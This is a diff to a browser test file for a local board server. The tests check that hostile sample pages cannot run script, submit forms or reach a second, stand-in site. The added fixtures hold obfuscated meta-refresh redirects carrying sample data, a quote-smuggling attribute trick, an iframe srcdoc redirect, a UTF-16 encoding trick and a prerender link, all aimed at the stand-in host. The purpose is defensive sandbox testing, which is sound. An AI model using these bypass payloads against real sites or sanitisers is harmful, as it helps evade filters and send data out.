@@ -1,7 +1,7 @@
 // T1001: the board's pages route in a browser. A hostile page cannot fetch the board, read the board's storage, submit
 // a form or reach another server, and runs no script of its own unless the owner opens it with ?scripts=1; a sage
-// message page's Today switch works; the task index links its pages; and a person's click on another site opens a page,
-// while a navigation that no person started does not (F6). It starts the real board server on a free loopback port
+// message page's Today switch works, but no meta refresh moves a page that holds it (F-T1013-1); the task index links
+// its pages; and a person's click on another site opens a page, while a navigation that no person started does not (F6). It starts the real board server on a free loopback port
 // (never 4173 or 43123) over a SAMPLE logbook and a SAMPLE pages folder in a temporary folder, and a second server on
 // another free port that stands for another site and counts each request that reaches it. It runs in
 // `npm run test:browser`, not in `npm test`, with Playwright's bundled Chromium, or the headless shell at
@@ -18,6 +18,7 @@ import { after, before, test } from "node:test";
 import { fileURLToPath } from "node:url";
 import { createBoardServer } from "../packages/sage-board/server.mjs";
 import { renderMessage } from "../packages/sage-core/message-checks.mjs";
+import { SWITCH_SCRIPT } from "../packages/sage-core/message-page.mjs";
 
 const require = createRequire(import.meta.url);
 const { chromium } = require("playwright");
@@ -46,6 +47,7 @@ mkdirSync(pages, { recursive: true });
 
 let browser, board, boardPort, other, otherPort, before_;
 const reached = []; // each request that reaches the other site
+const heard = new Map(); // the headers of each such request, by its address
 const at = (path) => `http://127.0.0.1:${boardPort}/pages/${LOGBOOK}/T1/${path}`;
 
 /**
@@ -53,7 +55,7 @@ const at = (path) => `http://127.0.0.1:${boardPort}/pages/${LOGBOOK}/T1/${path}`
  * script, which also writes what it saw in the page. Without its script, the markup still tries an image, a style, a
  * meta refresh is in its own page below.
  */
-const hostile = (other) => `<!DOCTYPE html><html><head><title>SAMPLE hostile page</title><link rel="stylesheet" href="${other}/style"></head><body>
+const hostile = (other) => `<!DOCTYPE html><html><head><title>SAMPLE hostile page</title><link rel="stylesheet" href="${other}/style"><script src="${other}/script"></script></head><body>
 <p id="out">no script ran</p><img src="${other}/image" alt=""><img src="/pages/${LOGBOOK}/T1/research.html" alt="">
 <form id="form" method="post" action="${other}/form"><input name="data" value="SAMPLE secret"></form>
 <script>
@@ -86,13 +88,26 @@ before(async () => {
   const message = renderMessage({ ...design, blocks: design.blocks.map((b) => (b.t === "page" ? { ...b, path: `/pages/${b.task}/${b.file}` } : b)) }, { pagePath: (name) => join(pages, name) });
   assert.ok(message.page, "the design message has a page");
   writeFileSync(join(pages, "design.html"), message.page.html);
+  // F-T1013-1: sage's own message page, with its exact switch script, and a meta refresh to the other site added.
+  const refresh = (meta) => message.page.html.replace("<title>", `${meta}<title>`);
+  writeFileSync(join(pages, "switch-refresh.html"), refresh(`<meta http-equiv="refresh" content="0;url=${otherSite}/switch-refresh?data=SAMPLE">`));
+  writeFileSync(join(pages, "switch-odd.html"), refresh(`<META\n  HTTP-EQUIV = 'Refresh' CONTENT='0;url=${otherSite}/switch-odd?data=SAMPLE'>`));
+  writeFileSync(join(pages, "switch-entity.html"), refresh(`<meta http-equiv=&#x72;efresh content=0;url=${otherSite}/switch-entity?data=SAMPLE>`));
+  // F-T1013-2: the browser reads the policy-like tag as the value of a, and http-equiv=refresh as the outer meta's.
+  writeFileSync(join(pages, "switch-quote.html"), refresh(`<meta a='<meta http-equiv="Content-Security-Policy" content="' http-equiv=refresh content='0;url=${otherSite}/switch-quote?data=SAMPLE'">`));
+  // F-T1013-6: a srcdoc value is decoded and read as a new page, whose refresh moves the frame.
+  writeFileSync(join(pages, "switch-srcdoc.html"), refresh(`<iframe srcdoc="&lt;meta http&#45;equiv=&quot;refresh&quot; content=&quot;0;url=${otherSite}/switch-srcdoc?data=SAMPLE&quot;&gt;"></iframe>`));
+  // F-T1013-5: a prerender link in a page with no script.
+  writeFileSync(join(pages, "prerender.html"), `<!DOCTYPE html><title>SAMPLE</title><link rel="prerender" href="${otherSite}/prerender?data=SAMPLE"><p>SAMPLE prerender</p>`);
+  // A UTF-16 byte order mark: the browser reads the refresh in UTF-16, while the switch script's bytes stay in UTF-8.
+  writeFileSync(join(pages, "switch-utf16.html"), Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(`<!DOCTYPE html><meta http-equiv="refresh" content="0;url=${otherSite}/switch-utf16?data=SAMPLE"><p>SAMPLE</p>`, "utf16le"), Buffer.from(`<script>${SWITCH_SCRIPT}</script>`)]));
   // The other site: it counts each request, and serves a page with a link to the board's page and a script that moves to it.
   other = createHttpServer((request, response) => {
     if (request.url === "/" || request.url === "/auto") {
       response.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
       return response.end(`<!DOCTYPE html><title>other site</title><a id="go" href="${at("research.html")}">page</a> <a id="scripts" href="${at("hostile.html")}?scripts=1">scripts</a> <a id="index" target="_blank" rel="opener" href="${at("")}">index</a>${request.url === "/auto" ? `<script>setTimeout(() => { location.href = ${JSON.stringify(at("research.html"))}; }, 50)</script>` : ""}`);
     }
-    reached.push(request.url);
+    reached.push(request.url); heard.set(request.url, request.headers);
     response.writeHead(204); response.end();
   });
   await new Promise((accept) => other.listen(otherPort, "127.0.0.1", accept));
@@ -168,6 +183,35 @@ test("a sage message page's Today switch works under the sandbox", async (t) => 
   assert.equal(await page.locator(".tg-today").first().isVisible(), true);
   assert.equal(await page.locator(".tg-after").first().isVisible(), false);
   assert.deepEqual(errors, []);
+});
+
+test("F-T1013-1: a page with sage's switch script and a meta refresh, in any spelling, stays on the Mac and reaches nothing", async (t) => {
+  const { page } = await context(t);
+  for (const name of ["switch-refresh.html", "switch-odd.html", "switch-entity.html", "switch-quote.html", "switch-srcdoc.html", "switch-utf16.html"]) {
+    reached.length = 0;
+    const response = await page.goto(at(name));
+    assert.equal(response.status(), 200, name);
+    await page.waitForTimeout(500); // the refresh's 0 s, and time for any request to arrive; the page must stay
+    assert.deepEqual(reached, [], `${name}: nothing reached the other site`);
+    assert.equal(page.url(), at(name), `${name}: the refresh did not move the page`);
+    assert.match(response.headers()["content-security-policy"], /^sandbox; /, `${name}: the page runs no script`);
+  }
+});
+
+// F-T1013-5: this pins a limit, not a guard. Chromium 140 sends a prerender link's request (NoStatePrefetch), and no
+// header that the board can send stops it (CSP, Permissions-Policy, COOP and COEP, Vary and others were tried). A build
+// without NoStatePrefetch sends none, so the test takes either; the request carries only its address, and the page stays.
+test("F-T1013-5: a prerender link in a page with no script can ask another site for its address, with no referrer, and the page stays", async (t) => {
+  const { page } = await context(t);
+  reached.length = 0;
+  const response = await page.goto(at("prerender.html"));
+  assert.match(response.headers()["content-security-policy"], /^sandbox; /);
+  for (let i = 0; i < 15 && !reached.length; i++) await page.waitForTimeout(100);
+  await page.waitForTimeout(300); // time for any second request to arrive
+  t.diagnostic(`the prerender request ${reached.length ? "reached" : "did not reach"} the other site in this browser`);
+  assert.ok(reached.length === 0 || reached.join() === "/prerender?data=SAMPLE", `only the address of the link: ${reached.join()}`);
+  if (reached.length) assert.equal(heard.get(reached[0]).referer, undefined, "no referrer");
+  assert.equal(page.url(), at("prerender.html"));
 });
 
 test("the task index opens its pages, and its scripts link runs a page's own script", async (t) => {
